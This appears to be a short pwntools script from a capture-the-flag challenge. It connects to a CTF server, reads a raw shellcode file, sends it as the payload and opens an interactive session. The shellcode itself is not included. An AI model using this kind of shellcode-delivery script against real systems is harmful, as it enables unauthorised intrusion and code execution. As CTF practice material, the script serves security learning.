from pwn import *
r = remote("ctf.1337.ma", 1333)

f= open("shellcode-raw",'rb')
payload = f.read()
f.close()

r.send(payload)
r.interactive()